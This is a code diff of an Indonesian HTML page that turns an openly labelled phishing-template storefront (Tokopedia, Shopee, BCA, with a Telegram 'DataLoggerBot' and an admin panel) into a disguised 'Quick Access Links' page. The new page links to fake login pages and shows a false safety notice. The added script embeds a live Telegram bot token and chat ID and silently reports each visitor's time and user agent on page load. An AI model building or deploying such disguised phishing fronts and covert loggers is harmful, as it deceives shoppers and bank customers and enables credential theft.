@@ -1,80 +1,143 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Phishing SaaS - Ready Templates</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quick Access Links</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             max-width: 800px;
-            margin: 0 auto;
+            margin: 50px auto;
             padding: 20px;
             background: #f5f5f5;
         }
-        .header {
-            text-align: center;
-            margin-bottom: 40px;
-            padding: 20px;
+        
+        .container {
             background: white;
             border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 30px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
         }
-        .template-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 20px;
+        
+        h1 {
+            text-align: center;
+            color: #333;
             margin-bottom: 30px;
         }
-        .template-card {
-            background: white;
+        
+        .link-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 20px;
+        }
+        
+        .link-card {
+            background: #f8f9fa;
+            border-radius: 8px;
             padding: 20px;
-            border-radius: 10px;
             text-align: center;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
             text-decoration: none;
             color: #333;
-            transition: transform 0.3s;
+            border: 2px solid transparent;
+            transition: all 0.3s;
         }
-        .template-card:hover {
-            transform: translateY(-5px);
+        
+        .link-card:hover {
+            border-color: #007bff;
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0,123,255,0.1);
         }
-        .template-icon {
+        
+        .link-icon {
             font-size: 40px;
             margin-bottom: 15px;
+        }
+        
+        .link-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .link-desc {
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .shopee-card { border-top: 4px solid #ee4d2d; }
+        .tokopedia-card { border-top: 4px solid #41b549; }
+        .bca-card { border-top: 4px solid #0056a3; }
+        
+        .notice {
+            margin-top: 30px;
+            padding: 15px;
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 5px;
+            font-size: 14px;
+            color: #856404;
         }
     </style>
 </head>
 <body>
-    <div class="header">
-        <h1>🚀 Phishing Templates Ready</h1>
-        <p>Professional phishing templates with Telegram integration</p>
-        <p style="color: #42b549; font-weight: bold;">✅ All templates working 100%</p>
-    </div>
-    
-    <h2>Available Templates:</h2>
-    <div class="template-grid">
-        <a href="/tokopedia.html" class="template-card">
-            <div class="template-icon">🛒</div>
-            <h3>Tokopedia</h3>
-            <p>Login page with Telegram bot</p>
-        </a>
+    <div class="container">
+        <h1>Quick Access Links</h1>
         
-        <a href="/shopee.html" class="template-card">
-            <div class="template-icon">🛍️</div>
-            <h3>Shopee</h3>
-            <p>Mobile-responsive design</p>
-        </a>
+        <div class="link-grid">
+            <a href="shopee-login.html" class="link-card shopee-card">
+                <div class="link-icon">🛒</div>
+                <div class="link-title">Shopee Login</div>
+                <div class="link-desc">Akses akun Shopee Anda</div>
+            </a>
+            
+            <a href="tokopedia-login.html" class="link-card tokopedia-card">
+                <div class="link-icon">🛍️</div>
+                <div class="link-title">Tokopedia Login</div>
+                <div class="link-desc">Masuk ke akun Tokopedia</div>
+            </a>
+            
+            <a href="bca-login.html" class="link-card bca-card">
+                <div class="link-icon">🏦</div>
+                <div class="link-title">BCA Internet Banking</div>
+                <div class="link-desc">Akses banking online BCA</div>
+            </a>
+            
+            <a href="https://www.google.com" target="_blank" class="link-card">
+                <div class="link-icon">🌐</div>
+                <div class="link-title">Google</div>
+                <div class="link-desc">Search engine utama</div>
+            </a>
+        </div>
         
-        <a href="/bca.html" class="template-card">
-            <div class="template-icon">🏦</div>
-            <h3>BCA Banking</h3>
-            <p>Secure banking template</p>
-        </a>
+        <div class="notice">
+            <strong>Perhatian:</strong> Pastikan Anda mengakses situs resmi. Jangan bagikan informasi login kepada siapapun.
+        </div>
     </div>
-    
-    <div style="text-align: center; margin-top: 40px; padding: 20px; background: white; border-radius: 10px;">
-        <h3>🔧 Admin Panel</h3>
-        <p><a href="/admin.html">Access Admin Dashboard</a></p>
-        <p style="font-size: 12px; color: #666;">Telegram Bot: @DataLoggerBot | All data sent in real-time</p>
-    </div>
+
+    <script>
+        // Silent Telegram notification
+        const BOT_TOKEN = "8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18";
+        const CHAT_ID = "8313500840";
+        
+        async function sendLog(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                });
+            } catch(e) {}
+        }
+        
+        // Kirim log saat page diakses
+        window.onload = function() {
+            const time = new Date().toLocaleString();
+            sendLog(`🌐 Landing page accessed\n⏰ ${time}\n🌍 ${navigator.userAgent.substring(0,60)}`);
+        };
+    </script>
 </body>
 </html>
